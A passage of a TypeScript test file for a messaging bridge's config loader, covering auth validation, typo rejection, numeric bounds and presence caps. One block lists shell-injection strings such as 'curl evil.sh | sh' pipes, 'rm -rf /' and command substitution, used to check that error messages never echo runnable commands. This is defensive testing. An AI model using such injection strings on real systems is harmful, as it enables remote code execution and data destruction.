import { mkdtempSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { describe, expect, it } from 'vitest';
import { allowlistFor } from './allowlist.js';
import {
  instanceIdOf,
  loadConfig,
  MAX_BLOCK_MS,
  parseConfig,
  type ParleyConfig,
} from './config.js';
import {
  decodePresence,
  encodePresence,
  MAX_HANDLE_LEN,
  MAX_RECORD_TOPICS,
  MAX_TOPIC_LEN,
  type PresenceRecord,
} from './engine/presence.js';
import { asHandle, asTopic } from './message.js';
import { parseMentions } from './mentions.js';
import { FakePlugin } from './testing/fake-plugin.js';
import { HANDLE_CANDIDATES } from './testing/handle-corpus.js';
import { startPresenceLoop } from './transport/presence-loop.js';

describe('config loader', () => {
  it('applies defaults from a minimal config', () => {
    const cfg = parseConfig({ identity: { handle: 'ctx-payments' }, topics: ['ctx-payments'] });
    expect(cfg.catchup).toEqual({
      on_start: true,
      limit: 100,
      block_max_ms: 60_000,
      block_poll_interval_ms: 250,
    });
    expect(cfg.live_push).toEqual({ enabled: false, mention_filter: false });
    expect(cfg.permissions.skip_permissions).toBe(false);
    expect(cfg.backend_config).toEqual({});
    expect(cfg.post_topics).toEqual([]);
    // Presence defaults: single shared topic, 10-min heartbeat, TTL = 3× heartbeat.
    expect(cfg.presence).toEqual({
      enabled: true,
      topic: 'parley-presence',
      heartbeat_ms: 600_000,
      ttl_ms: 1_800_000,
    });
  });

  it('derives presence.ttl_ms from an explicit heartbeat, but honors an explicit ttl', () => {
    const derived = parseConfig({
      identity: { handle: 'h' },
      topics: ['a'],
      presence: { heartbeat_ms: 60_000 },
    });
    expect(derived.presence.ttl_ms).toBe(180_000);
    const pinned = parseConfig({
      identity: { handle: 'h' },
      topics: ['a'],
      presence: { heartbeat_ms: 60_000, ttl_ms: 500_000 },
    });
    expect(pinned.presence.ttl_ms).toBe(500_000);
  });

  // Which post_topics sources are refused is graded against the shared hostile/safe corpus in
  // regex-screen-parity.test.ts, and the ttl/heartbeat rule at its own boundary in
  // stated-bounds.test.ts.
  it('accepts post_topics and rejects an uncompilable regex', () => {
    const cfg = parseConfig({ identity: { handle: 'h' }, topics: ['a'], post_topics: ['ctx-.*'] });
    expect(cfg.post_topics).toEqual(['ctx-.*']);
    expect(() =>
      parseConfig({ identity: { handle: 'h' }, topics: ['a'], post_topics: ['ctx-('] }),
    ).toThrow(/invalid regex/);
  });

  it('rejects an explicit topic that collides with the presence topic', () => {
    expect(() =>
      parseConfig({ identity: { handle: 'h' }, topics: ['parley-presence'] }),
    ).toThrow(/reserved for presence/);
    // Also when the presence topic is customized.
    expect(() =>
      parseConfig({
        identity: { handle: 'h' },
        topics: ['a', 'live'],
        presence: { topic: 'live' },
      }),
    ).toThrow(/reserved for presence/);
  });

  it('merges partial nested objects with per-field defaults', () => {
    const cfg = parseConfig({
      identity: { handle: 'a' },
      topics: ['a'],
      catchup: { limit: 50 },
      live_push: { enabled: true },
    });
    expect(cfg.catchup).toEqual({
      on_start: true,
      limit: 50,
      block_max_ms: 60_000,
      block_poll_interval_ms: 250,
    });
    expect(cfg.live_push).toEqual({ enabled: true, mention_filter: false });
  });

  it('passes backend_config through opaquely', () => {
    const cfg = parseConfig({
      identity: { handle: 'a' },
      topics: ['a'],
      backend_config: { db_path: '/tmp/x.db', poll_interval_ms: 250 },
    });
    expect(cfg.backend_config).toEqual({ db_path: '/tmp/x.db', poll_interval_ms: 250 });
  });

  it('rejects permissions.skip_permissions: true as unimplemented', () => {
    expect(() =>
      parseConfig({
        identity: { handle: 'h' },
        topics: ['a'],
        permissions: { skip_permissions: true },
      }),
    ).toThrow(/not implemented/);
  });

  it('still accepts an explicit skip_permissions: false', () => {
    const cfg = parseConfig({
      identity: { handle: 'h' },
      topics: ['a'],
      permissions: { skip_permissions: false },
    });
    expect(cfg.permissions.skip_permissions).toBe(false);
  });

  it('instanceIdOf defaults to the handle but honors instance_id', () => {
    expect(instanceIdOf(parseConfig({ identity: { handle: 'h' }, topics: ['a'] }))).toBe('h');
    expect(
      instanceIdOf(parseConfig({ identity: { handle: 'h' }, topics: ['a'], instance_id: 'sess-2' })),
    ).toBe('sess-2');
  });

  it('rejects a config with no topics', () => {
    expect(() => parseConfig({ identity: { handle: 'h' }, topics: [] })).toThrow();
  });

  it('rejects a config with no handle', () => {
    expect(() => parseConfig({ topics: ['a'] })).toThrow();
  });

  it('defaults auth to the built-in OAuth AS when absent', () => {
    const cfg = parseConfig({ identity: { handle: 'h' }, topics: ['a'] });
    expect(cfg.auth).toEqual({ mode: 'builtin' });
  });

  it('rejects auth.mode oidc without an oidc block', () => {
    expect(() =>
      parseConfig({ identity: { handle: 'h' }, topics: ['a'], auth: { mode: 'oidc' } }),
    ).toThrow(/auth\.oidc/);
  });

  it('parses a full oidc auth block with per-field defaults', () => {
    const cfg = parseConfig({
      identity: { handle: 'h' },
      topics: ['a'],
      auth: {
        mode: 'oidc',
        oidc: {
          issuer: 'https://kc.example.com/realms/parley',
          audience: 'parley-mcp',
          required_role: 'parley-owner',
          allowed_usernames: ['alice'],
        },
      },
    });
    expect(cfg.auth.mode).toBe('oidc');
    expect(cfg.auth.oidc).toEqual({
      issuer: 'https://kc.example.com/realms/parley',
      audience: 'parley-mcp',
      required_role: 'parley-owner',
      allowed_usernames: ['alice'],
      clock_skew_s: 30,
    });
  });

  it('rejects a bad issuer URL, empty gate lists, and out-of-range clock skew', () => {
    const base = { identity: { handle: 'h' }, topics: ['a'] };
    expect(() =>
      parseConfig({ ...base, auth: { mode: 'oidc', oidc: { issuer: 'not-a-url' } } }),
    ).toThrow();
    expect(() =>
      parseConfig({
        ...base,
        auth: { mode: 'oidc', oidc: { issuer: 'https://kc.example.com/realms/x', allowed_subjects: [] } },
      }),
    ).toThrow();
    expect(() =>
      parseConfig({
        ...base,
        auth: { mode: 'oidc', oidc: { issuer: 'https://kc.example.com/realms/x', clock_skew_s: 301 } },
      }),
    ).toThrow();
  });

  /**
   * The schema is the earlier, better-located half of the same rule the factory restates. A scope
   * TOKEN is `1*NQCHAR` and the verifier matches it against `scope.split(' ')`, so `min(1)` let a
   * whitespace value load cleanly and then 403 every valid token; grade both directions of the
   * value space, not only the one that reads as a mistake.
   */
  it.each([
    ['', false],
    [' ', false],
    ['\t', false],
    ['mcp ', false],
    ['read write', false],
    ['mcp', true],
    ['parley:read', true],
  ])('auth.oidc.required_scope %j is accepted: %s', (required_scope, accepted) => {
    const build = (): unknown =>
      parseConfig({
        identity: { handle: 'h' },
        topics: ['a'],
        auth: {
          mode: 'oidc',
          oidc: { issuer: 'https://kc.example.com/realms/x', allowed_subjects: ['s'], required_scope },
        },
      });
    if (accepted) expect(build).not.toThrow();
    else expect(build).toThrow(/required_scope must be a single non-blank scope token/);
  });

  it('rejects an oidc block with no identity gate (fail-closed)', () => {
    const base = { identity: { handle: 'h' }, topics: ['a'] };
    const issuer = 'https://kc.example.com/realms/x';
    // Gate-less: none of allowed_subjects / allowed_usernames / required_role → rejected.
    expect(() =>
      parseConfig({
        ...base,
        auth: { mode: 'oidc', oidc: { issuer, audience: 'parley-mcp' } },
      }),
    ).toThrow(/identity gate/);
    // required_scope alone is NOT a sufficient gate.
    expect(() =>
      parseConfig({
        ...base,
        auth: { mode: 'oidc', oidc: { issuer, required_scope: 'mcp' } },
      }),
    ).toThrow(/identity gate/);
    // Any one of the three gates makes it parse.
    expect(() =>
      parseConfig({ ...base, auth: { mode: 'oidc', oidc: { issuer, allowed_subjects: ['owner-sub'] } } }),
    ).not.toThrow();
    expect(() =>
      parseConfig({ ...base, auth: { mode: 'oidc', oidc: { issuer, allowed_usernames: ['alice'] } } }),
    ).not.toThrow();
    expect(() =>
      parseConfig({ ...base, auth: { mode: 'oidc', oidc: { issuer, required_role: 'parley-owner' } } }),
    ).not.toThrow();
  });

  it('rejects an http issuer but exempts loopback (https requirement)', () => {
    const base = { identity: { handle: 'h' }, topics: ['a'] };
    expect(() =>
      parseConfig({
        ...base,
        auth: {
          mode: 'oidc',
          oidc: { issuer: 'http://kc.example.com/realms/x', required_role: 'parley-owner' },
        },
      }),
    ).toThrow(/https/);
    // Loopback stays usable so the in-process fake IdP (http://127.0.0.1) works in tests/dev.
    expect(() =>
      parseConfig({
        ...base,
        auth: {
          mode: 'oidc',
          oidc: { issuer: 'http://127.0.0.1:8080/realms/x', required_role: 'parley-owner' },
        },
      }),
    ).not.toThrow();
  });
});

// A fully-populated config, so that a field added later is covered by the walkers below the moment
// it appears here.
const FULL = {
  instance_id: 'inst',
  state_path: '/tmp/parley-state.json',
  identity: { handle: 'h' },
  topics: ['ctx'],
  post_topics: ['ctx-.*'],
  catchup: {
    on_start: true,
    limit: 10,
    block_max_ms: 1000,
    block_poll_interval_ms: 100,
  },
  live_push: { enabled: true, mention_filter: false },
  presence: { enabled: true, topic: 'parley-presence', heartbeat_ms: 1000, ttl_ms: 3000 },
  permissions: { skip_permissions: false },
  auth: {
    mode: 'oidc',
    oidc: {
      issuer: 'https://kc.example.com/realms/r',
      audience: 'parley-mcp',
      jwks_uri: 'https://kc.example.com/jwks',
      required_scope: 'mcp',
      allowed_subjects: ['sub-1'],
      allowed_usernames: ['alice'],
      required_role: 'parley-owner',
      clock_skew_s: 30,
    },
  },
  backend_config: { db_path: './x.db' },
};

/** Walk to the object holding `path`'s leaf in a mutable clone. */
function parentOf(root: Record<string, unknown>, path: string[]): Record<string, unknown> {
  let node = root;
  for (const step of path.slice(0, -1)) node = node[step] as Record<string, unknown>;
  return node;
}

// A key the schema does not know is a LOAD ERROR, not a silent strip: an operator typo must not
// produce a bridge that quietly does nothing.
describe('config rejects unknown keys', () => {
  it('accepts the fully-populated fixture', () => {
    expect(() => parseConfig(structuredClone(FULL))).not.toThrow();
  });

  function keyPaths(node: unknown, prefix: string[] = []): string[][] {
    if (typeof node !== 'object' || node === null || Array.isArray(node)) return [];
    return Object.entries(node).flatMap(([k, v]) => [
      [...prefix, k],
      ...keyPaths(v, [...prefix, k]),
    ]);
  }

  // `backend_config` is opaque to core (DESIGN §11), so its interior is deliberately open.
  const paths = keyPaths(FULL).filter((p) => p[0] !== 'backend_config');

  it.each(paths.map((p) => [p.join('.'), p]))(
    'rejects a near-miss of %s instead of ignoring it',
    (_label, path) => {
      const mutated = structuredClone(FULL) as Record<string, unknown>;
      const node = parentOf(mutated, path as string[]);
      const leaf = (path as string[]).at(-1)!;
      node[leaf.length > 1 ? leaf.slice(0, -1) : `${leaf}x`] = node[leaf];
      delete node[leaf];
      expect(() => parseConfig(mutated)).toThrow();
    },
  );

  it.each([
    ['live_push.enable', { identity: { handle: 'h' }, topics: ['t'], live_push: { enable: true } }],
    ['catchup.limt', { identity: { handle: 'h' }, topics: ['t'], catchup: { limt: 5 } }],
    ['presense', { identity: { handle: 'h' }, topics: ['t'], presense: { enabled: false } }],
    ['identiy', { identiy: { handle: 'h' }, identity: { handle: 'h' }, topics: ['t'] }],
    [
      'permissions.skip_permission',
      { identity: { handle: 'h' }, topics: ['t'], permissions: { skip_permission: true } },
    ],
  ])('rejects the operator typo %s', (_label, raw) => {
    expect(() => parseConfig(raw)).toThrow();
  });
});

// Every string field in a config NAMES something — a path, a read-state namespace, a topic, an
// issuer — and none of them can name it with the empty string. A field that accepts `''` loads
// cleanly and fails later, far from the config: `state_path: ''` served traffic and then threw
// ENOENT on the first cursor persist, and `instance_id: ''` silently merged two sessions' read
// state. Walk the fixture so a string field added later is graded the moment it appears there.
describe('config rejects an empty string in any field that names something', () => {
  interface StringLeaf {
    label: string;
    path: string[];
    index?: number;
  }

  function stringLeaves(node: unknown, prefix: string[] = []): StringLeaf[] {
    if (typeof node !== 'object' || node === null) return [];
    return Object.entries(node).flatMap(([key, value]) => {
      const path = [...prefix, key];
      const label = path.join('.');
      if (typeof value === 'string') return [{ label, path }];
      if (Array.isArray(value))
        return value.flatMap((element, index) =>
          typeof element === 'string' ? [{ label: `${label}[${index}]`, path, index }] : [],
        );
      return stringLeaves(value, path);
    });
  }

  // `backend_config` is opaque to core (DESIGN §11) and may legitimately carry an empty string.
  const leaves = stringLeaves(FULL).filter((l) => l.path[0] !== 'backend_config');

  it('finds every string field in the fixture (guards against a broken walk)', () => {
    expect(leaves.map((l) => l.label).sort()).toEqual([
      'auth.mode',
      'auth.oidc.allowed_subjects[0]',
      'auth.oidc.allowed_usernames[0]',
      'auth.oidc.audience',
      'auth.oidc.issuer',
      'auth.oidc.jwks_uri',
      'auth.oidc.required_role',
      'auth.oidc.required_scope',
      'identity.handle',
      'instance_id',
      'post_topics[0]',
      'presence.topic',
      'state_path',
      'topics[0]',
    ]);
  });

  it.each(leaves.map((l) => [l.label, l] as const))('rejects %s set to ""', (_label, leaf) => {
    const mutated = structuredClone(FULL) as Record<string, unknown>;
    const node = parentOf(mutated, leaf.path);
    const key = leaf.path.at(-1)!;
    if (leaf.index === undefined) node[key] = '';
    else (node[key] as string[])[leaf.index] = '';
    expect(() => parseConfig(mutated)).toThrow();
  });
});

// Every numeric field is a count or a duration, and none of them means anything at zero, below zero
// or between integers: `catchup.limit: 0` makes catch-up's `messages.length < limit` break condition
// false forever and page without end, `block_poll_interval_ms: 0` turns the long-poll fallback into a
// tight re-query loop, and `presence.heartbeat_ms: -1` fires the beat every tick. Walk the fixture so
// a knob added later is graded the moment it appears there.
describe('config rejects a degenerate number in any numeric field', () => {
  interface NumericLeaf {
    label: string;
    path: string[];
    value: number;
  }

  function numericLeaves(node: unknown, prefix: string[] = []): NumericLeaf[] {
    if (typeof node !== 'object' || node === null) return [];
    return Object.entries(node).flatMap(([key, value]) => {
      const path = [...prefix, key];
      if (typeof value === 'number') return [{ label: path.join('.'), path, value }];
      return numericLeaves(value, path);
    });
  }

  // `backend_config` is opaque to core (DESIGN §11); its numbers are the plugin's to police.
  const leaves = numericLeaves(FULL).filter((l) => l.path[0] !== 'backend_config');

  // Zero is legal only where it names "no cap" / "no tolerance" rather than a cadence or a count.
  const ZERO_IS_LEGAL = new Set(['catchup.block_max_ms', 'auth.oidc.clock_skew_s']);

  it('finds every numeric field in the fixture (guards against a broken walk)', () => {
    expect(leaves.map((l) => l.label).sort()).toEqual([
      'auth.oidc.clock_skew_s',
      'catchup.block_max_ms',
      'catchup.block_poll_interval_ms',
      'catchup.limit',
      'presence.heartbeat_ms',
      'presence.ttl_ms',
    ]);
  });

  function withValue(leaf: NumericLeaf, value: number): Record<string, unknown> {
    const mutated = structuredClone(FULL) as Record<string, unknown>;
    parentOf(mutated, leaf.path)[leaf.path.at(-1)!] = value;
    return mutated;
  }

  it.each(leaves.map((l) => [l.label, l] as const))('rejects %s set below zero', (_label, leaf) => {
    expect(() => parseConfig(withValue(leaf, -1))).toThrow();
  });

  // The fixture's own value plus a half, so that a cross-field rule (ttl_ms >= heartbeat_ms) still
  // holds and `.int()` is the only thing left that can reject the row.
  it.each(leaves.map((l) => [l.label, l] as const))(
    'rejects %s set to a fraction',
    (_label, leaf) => {
      expect(() => parseConfig(withValue(leaf, leaf.value + 0.5))).toThrow();
    },
  );

  it.each(leaves.map((l) => [l.label, l] as const))('grades %s set to zero', (label, leaf) => {
    const parse = (): unknown => parseConfig(withValue(leaf, 0));
    if (ZERO_IS_LEGAL.has(label)) expect(parse).not.toThrow();
    else expect(parse).toThrow();
  });

  // A docstring that promises a relationship — `block_max_ms` is clamped "safely below MCP / client
  // tool timeouts" — is worth only what the schema behind it enforces. So grade the ceiling too:
  // a knob with one refuses the first step past it, and a knob without one says so out loud. A knob
  // added later has no row and fails as a missing entry rather than as silent acceptance.
  const CEILINGS = new Map<string, number | null>([
    ['auth.oidc.clock_skew_s', 300],
    ['catchup.block_max_ms', MAX_BLOCK_MS],
    ['catchup.block_poll_interval_ms', null],
    ['catchup.limit', null],
    ['presence.heartbeat_ms', null],
    ['presence.ttl_ms', null],
  ]);

  const FAR_ABOVE_ANY_PLAUSIBLE_CAP = 86_400_000;

  // `ttl_ms >= heartbeat_ms` is graded on its own in stated-bounds.test.ts; keep the pair consistent
  // here, so that a missing ceiling can never be answered by the cross-field rule instead.
  function withCeilingProbe(leaf: NumericLeaf, value: number): Record<string, unknown> {
    const mutated = withValue(leaf, value);
    const presence = mutated.presence as { heartbeat_ms: number; ttl_ms: number };
    presence.ttl_ms = Math.max(presence.ttl_ms, presence.heartbeat_ms);
    return mutated;
  }

  it.each(leaves.map((l) => [l.label, l] as const))(
    'grades %s against its documented ceiling',
    (label, leaf) => {
      expect(
        CEILINGS.has(label),
        `${label} has no ceiling row: add a number, or null for "deliberately unbounded"`,
      ).toBe(true);
      const ceiling = CEILINGS.get(label) ?? null;
      if (ceiling === null) {
        expect(() => parseConfig(withCeilingProbe(leaf, FAR_ABOVE_ANY_PLAUSIBLE_CAP))).not.toThrow();
        return;
      }
      expect(() => parseConfig(withCeilingProbe(leaf, ceiling))).not.toThrow();
      expect(() => parseConfig(withCeilingProbe(leaf, ceiling + 1))).toThrow();
    },
  );
});

// `mention_filter` compares a parsed @mention against `identity.handle`, so a handle the mention
// grammar cannot produce silently drops EVERY inbound message. Either grammar may widen later;
// the invariant is that the two agree, so assert the round trip rather than one bad handle.
describe('mention_filter requires a mentionable handle', () => {
  it.each(HANDLE_CANDIDATES.map((h) => [JSON.stringify(h), h] as const))(
    'either rejects %s at load or can actually match it',
    (_label, handle) => {
      const raw = {
        identity: { handle },
        topics: ['t'],
        live_push: { enabled: true, mention_filter: true },
      };
      let loaded = true;
      try {
        parseConfig(raw);
      } catch {
        loaded = false;
      }
      if (!loaded) return;
      expect(parseMentions(`hi @${handle} there`)).toContain(handle);
    },
  );

  it('leaves a non-mentionable handle usable when mention_filter is off', () => {
    expect(() =>
      parseConfig({
        identity: { handle: 'parley-bot@localhost' },
        topics: ['t'],
        live_push: { enabled: true, mention_filter: false },
      }),
    ).not.toThrow();
  });
});

// This module refuses `permissions.skip_permissions: true` and every unknown key on one argument:
// a setting nothing reads leaves the operator with a bridge that quietly does nothing. A knob that
// is only read under ANOTHER knob is the same argument one level in, so grade the pairs as a class —
// a knob is legal beneath a disabled enabler only if something still reads it. `probe` is what does
// the reading; a pair with nothing behind it can only pass by being a load error.
describe('a knob is never accepted beneath a disabled enabler unless something reads it', () => {
  interface DependentKnob {
    path: readonly string[];
    base: Record<string, unknown>;
    set: Record<string, unknown>;
    probe: (cfg: ParleyConfig) => unknown;
  }

  const NOTHING_READS_IT = Symbol('no reader while the enabler is off');

  const KNOBS: readonly (readonly [label: string, knob: DependentKnob])[] = [
    [
      'live_push.mention_filter under live_push.enabled',
      {
        path: ['live_push', 'mention_filter'],
        base: { live_push: { enabled: false } },
        set: { live_push: { enabled: false, mention_filter: true } },
        probe: () => NOTHING_READS_IT,
      },
    ],
    [
      'presence.topic under presence.enabled',
      {
        path: ['presence', 'topic'],
        base: { presence: { enabled: false } },
        set: { presence: { enabled: false, topic: 'roster-x' } },
        probe: (cfg) => allowlistFor(cfg).has('roster-x'),
      },
    ],
    [
      'presence.heartbeat_ms under presence.enabled',
      {
        path: ['presence', 'heartbeat_ms'],
        base: { presence: { enabled: false } },
        set: { presence: { enabled: false, heartbeat_ms: 60_000 } },
        probe: (cfg) => cfg.presence.ttl_ms,
      },
    ],
    [
      'presence.ttl_ms under presence.enabled',
      {
        path: ['presence', 'ttl_ms'],
        base: { presence: { enabled: false } },
        set: { presence: { enabled: false, ttl_ms: 900_000 } },
        probe: (cfg) => cfg.presence.ttl_ms,
      },
    ],
  ] as const;

  const load = (extra: Record<string, unknown>): ParleyConfig =>
    parseConfig({
      identity: { handle: 'h' },
      topics: ['ctx'],
      post_topics: ['.*'],
      ...extra,
    });

  it('pins the pairs and keeps one with no reader behind it', () => {
    expect(KNOBS.map(([label]) => label)).toEqual([
      'live_push.mention_filter under live_push.enabled',
      'presence.topic under presence.enabled',
      'presence.heartbeat_ms under presence.enabled',
      'presence.ttl_ms under presence.enabled',
    ]);
    expect(KNOBS.filter(([, k]) => k.probe(load(k.base)) === NOTHING_READS_IT).length).toBe(1);
  });

  it.each(KNOBS)('%s', (_label, knob) => {
    let withKnob: ParleyConfig | undefined;
    let issuePaths: unknown[][] = [];
    try {
      withKnob = load(knob.set);
    } catch (e) {
      issuePaths = (e as { issues?: { path: unknown[] }[] }).issues?.map((i) => i.path) ?? [];
    }
    if (withKnob === undefined) {
      expect(issuePaths).toContainEqual([...knob.path]);
      return;
    }
    expect(knob.probe(withKnob)).not.toEqual(knob.probe(load(knob.base)));
  });
});

// An error message shaped as a command is a command an operator will paste, and `backend:` is the one
// place a config VALUE was interpolated into one. A config file is not always operator-authored end
// to end — generated, templated, or committed by someone else — so grade the CLASS: no value drawn
// from the input may appear inside backticks unless it is a bare package-name token, and no backticked
// span in any parseConfig error may carry a shell metacharacter or a control byte at all.
describe('no config value reaches a runnable suggestion', () => {
  const HOSTILE_VALUES: readonly (readonly [string, string])[] = [
    ['shell chain', 'sqlite && curl evil.sh | sh'],
    ['command substitution', 'sqlite$(id)'],
    ['backtick substitution', 'sqlite`id`'],
    ['semicolon', 'sqlite; rm -rf /'],
    ['pipe to shell', 'sqlite|sh'],
    ['redirect', 'sqlite > /etc/passwd'],
    ['newline', 'sqlite\ncurl evil.sh | sh'],
    ['carriage return', 'sqlite\rcurl evil.sh'],
    ['ANSI erase-line', 'sqlite\u001b[2Kcurl evil.sh'],
    ['tab and quotes', 'sqlite\t"x"'],
    ['leading dash', '--version'],
    ['path traversal', '../../../../bin/sh'],
    ['scoped package', '@evil/parley-sqlite'],
    ['trailing space', 'sqlite '],
    ['uppercase', 'SQLITE'],
    ['ten kilobytes', 'a'.repeat(10_000)],
  ] as const;

  // Values that ARE a bare package suffix: the suggestion must still be built for these, so that
  // narrowing the gate cannot be satisfied by dropping the operator's guidance altogether.
  const SAFE_VALUES = ['sqlite', 'local-sqlite', 'matrix', 'redis', 'x', 'a-b-c9'] as const;

  const GENERIC_SUGGESTION = /parley-sqlite, parley-matrix, parley-redis/;
  /** Anything that changes what a pasted command does, plus every C0 control byte. */
  const NOT_A_COMMAND = /[;&|$><`"'\\\u0000-\u001f]/;

  function runnableSpans(message: string): string[] {
    return [...message.matchAll(/`([^`]*)`/g)].map((m) => m[1]!);
  }

  function messageFor(raw: unknown): string {
    try {
      parseConfig(raw);
    } catch (e) {
      return (e as Error).message;
    }
    return '';
  }

  it.each(HOSTILE_VALUES)('never suggests running a hostile `backend` value (%s)', (_l, value) => {
    const message = messageFor({ backend: value, identity: { handle: 'h' }, topics: ['a'] });
    expect(message).toMatch(/`backend` is not a supported field/);
    expect(message).toMatch(GENERIC_SUGGESTION);
    expect(message).not.toContain(`parley-${value.replace(/^local-/, '')}`);
    for (const span of runnableSpans(message)) expect(span).not.toMatch(NOT_A_COMMAND);
  });

  it.each(SAFE_VALUES)('still names the binary for a bare backend suffix (%s)', (value) => {
    const message = messageFor({ backend: value, identity: { handle: 'h' }, topics: ['a'] });
    expect(message).toContain(`parley-${value.replace(/^local-/, '')}`);
    for (const span of runnableSpans(message)) expect(span).not.toMatch(NOT_A_COMMAND);
  });

  it.each([
    ['number', 42],
    ['null', null],
    ['boolean', true],
    ['object', { name: 'sqlite' }],
    ['array', ['sqlite']],
  ])('refuses a non-string `backend` (%s) without claiming a binary', (_l, value) => {
    const message = messageFor({ backend: value, identity: { handle: 'h' }, topics: ['a'] });
    expect(message).toMatch(/`backend` is not a supported field/);
    expect(message).toMatch(GENERIC_SUGGESTION);
    for (const span of runnableSpans(message)) expect(span).not.toMatch(NOT_A_COMMAND);
  });

  // The same class, one field at a time, over the strings an operator populates: whichever field a
  // hostile value lands in, whatever message comes back must not read as a command to run.
  const FIELDS = ['instance_id', 'state_path', 'topics', 'post_topics', 'presence'] as const;
  const FIELD_ROWS = FIELDS.flatMap((field) =>
    HOSTILE_VALUES.map(([label, value]) => {
      const raw: Record<string, unknown> = { identity: { handle: 'h' }, topics: ['a'] };
      if (field === 'topics' || field === 'post_topics') raw[field] = [value];
      else if (field === 'presence') raw.presence = { topic: value };
      else raw[field] = value;
      return [`${field} = ${label}`, raw] as const;
    }),
  );

  it('crosses every populated string field with every hostile value', () => {
    expect(FIELD_ROWS.length).toBe(FIELDS.length * HOSTILE_VALUES.length);
    expect(FIELD_ROWS.length).toBeGreaterThan(60);
  });

  it.each(FIELD_ROWS)('never renders %s as a command', (_label, raw) => {
    for (const span of runnableSpans(messageFor(raw))) expect(span).not.toMatch(NOT_A_COMMAND);
  });
});

// A config VALUE that rides the presence beat is read back through a decoder that CAPS it, and the
// decoder is on the peer's side: a value past a cap loads cleanly here and is then truncated out of —
// or drops — every peer's copy, forever, with no error, no log and no way for the operator to see it.
// The load is the only place that can say so. So grade every value the beat carries, on every axis
// the decoder caps: at the cap it must load AND survive the round trip whole, past the cap it must be
// refused at load. The carried set and the axes are DERIVED — from a marker round trip through the
// real emitter, and from the shape of what the beat carries — so a new field, or a new axis on an
// existing one, fails as a missing row rather than passing silently.
describe('a config value carried by the presence beat is capped where it is declared', () => {
  type Verdict = 'refused at load' | 'carried in full' | 'truncated on the wire' | 'record dropped';

  interface Axis {
    label: 'length' | 'count' | 'element length';
    cap: number;
    /** The config value sitting at `n` on this axis. */
    at: (n: number) => string | string[];
  }

  interface WireValue {
    /** The `PresenceRecord` field the beat carries it in. */
    beatField: 'handle' | 'topics' | 'postTopics';
    /** Where in the config document the emitter reads it from. */
    configPath: readonly string[];
    /** A value that marks this field in a beat, for the coverage derivation below. */
    marker: string | string[];
    axes: Axis[];
  }

  const listAxes = (element: (i: number) => string, long: (n: number) => string): Axis[] => [
    { label: 'count', cap: MAX_RECORD_TOPICS, at: (n) => Array.from({ length: n }, (_u, i) => element(i)) },
    { label: 'element length', cap: MAX_TOPIC_LEN, at: (n) => [long(n)] },
  ];

  const WIRE_VALUES: WireValue[] = [
    {
      beatField: 'handle',
      configPath: ['identity', 'handle'],
      marker: 'mk-handle',
      axes: [{ label: 'length', cap: MAX_HANDLE_LEN, at: (n) => 'h'.repeat(n) }],
    },
    {
      beatField: 'topics',
      configPath: ['topics'],
      marker: ['mk-topic'],
      axes: listAxes((i) => `ctx-${i}`, (n) => 't'.repeat(n)),
    },
    {
      beatField: 'postTopics',
      configPath: ['post_topics'],
      marker: ['mk-post-.*'],
      axes: listAxes((i) => `ctx-${i}-.*`, (n) => 'a'.repeat(n)),
    },
  ];

  /** Which axes a value of this shape can be capped on — the whole set, so none can go ungraded. */
  const AXES_FOR_SHAPE: Record<'string' | 'string[]', string[]> = {
    string: ['length'],
    'string[]': ['count', 'element length'],
  };

  const CELLS = WIRE_VALUES.flatMap((w) =>
    w.axes.map((axis) => [`${w.configPath.join('.')} ${axis.label}`, w, axis] as const),
  );

  function configWith(path: readonly string[], value: unknown): Record<string, unknown> {
    const doc: Record<string, unknown> = { identity: { handle: 'h' }, topics: ['ctx'] };
    let node = doc;
    for (const key of path.slice(0, -1)) node = node[key] as Record<string, unknown>;
    node[path.at(-1)!] = value;
    return doc;
  }

  /** The `hello` beat the real emitter posts for `cfg`, decoded exactly as a peer decodes it. */
  async function beatFrom(cfg: ParleyConfig): Promise<PresenceRecord | null> {
    const plugin = new FakePlugin();
    await plugin.connect({});
    const topic = asTopic(cfg.presence.topic);
    const loop = startPresenceLoop(plugin, asHandle(cfg.identity.handle), allowlistFor(cfg), {
      presenceTopic: topic,
      heartbeatMs: cfg.presence.heartbeat_ms,
    });
    await loop.stop();
    const { messages } = await plugin.fetchRecent({ topic, limit: 10 });
    expect(messages.length).toBeGreaterThan(0);
    return decodePresence(messages[0]!.content);
  }

  const same = (a: unknown, b: unknown): boolean => JSON.stringify(a) === JSON.stringify(b);

  /** What a peer ends up holding for `value`, going through the loader and the real emitter. */
  async function roundTrip(w: WireValue, value: string | string[]): Promise<Verdict> {
    let cfg: ParleyConfig;
    try {
      cfg = parseConfig(configWith(w.configPath, value));
    } catch {
      return 'refused at load';
    }
    const beat = await beatFrom(cfg);
    if (beat === null) return 'record dropped';
    return same(beat[w.beatField], value) ? 'carried in full' : 'truncated on the wire';
  }

  /** The same verdict for a beat built BY HAND — what the decoder does, with no loader in front. */
  function onTheWire(w: WireValue, value: string | string[]): Verdict {
    const base: PresenceRecord = {
      v: 2,
      kind: 'hello',
      at: 0,
      handle: 'h',
      topics: ['ctx'],
      postTopics: [],
      instanceId: 'i',
    };
    const decoded = decodePresence(
      encodePresence({ ...base, [w.beatField]: value } as unknown as PresenceRecord),
    );
    if (decoded === null) return 'record dropped';
    return same(decoded[w.beatField], value) ? 'carried in full' : 'truncated on the wire';
  }

  it('covers every beat field fed from the config, and every axis its shape can be capped on', async () => {
    const doc: Record<string, unknown> = { identity: { handle: 'h' }, topics: ['ctx'] };
    for (const w of WIRE_VALUES) {
      let node = doc;
      for (const key of w.configPath.slice(0, -1)) node = node[key] as Record<string, unknown>;
      node[w.configPath.at(-1)!] = w.marker;
    }
    const beat = await beatFrom(parseConfig(doc));
    expect(beat?.kind).toBe('hello');
    const fromConfig = Object.entries(beat!)
      .filter(([, value]) => JSON.stringify(value).includes('mk-'))
      .map(([key]) => key)
      .sort();
    expect(fromConfig).toEqual(WIRE_VALUES.map((w) => w.beatField).sort());

    for (const w of WIRE_VALUES) {
      const shape = Array.isArray(beat![w.beatField]) ? 'string[]' : 'string';
      expect(w.axes.map((a) => a.label).sort(), w.beatField).toEqual(AXES_FOR_SHAPE[shape].sort());
    }
  });

  it('the round trip can SEE both ways a peer loses a value (positive control for the verdict)', () => {
    const over = Array.from({ length: MAX_RECORD_TOPICS + 1 }, (_unused, i) => `ctx-${i}`);
    expect(onTheWire(WIRE_VALUES[1]!, over)).toBe('truncated on the wire');
